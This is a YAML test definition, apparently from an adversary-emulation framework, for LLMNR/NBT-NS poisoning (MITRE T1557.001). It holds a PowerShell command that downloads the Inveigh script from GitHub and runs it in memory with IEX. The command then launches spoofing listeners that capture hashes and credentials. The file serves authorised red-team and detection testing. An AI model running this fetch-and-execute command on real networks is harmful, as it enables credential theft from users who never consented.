- id: b7b43e34-cf3b-500b-9d66-8c6e55edde18
  name: Soumaia ART Tests - LLMNR Poisoning with Inveigh (PowerShell)
  description: Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out. (requires elevation)
  tactic: collection
  technique:
    attack_id: T1557.001
    name: 'Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1" -UseBasicParsing)
          Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y
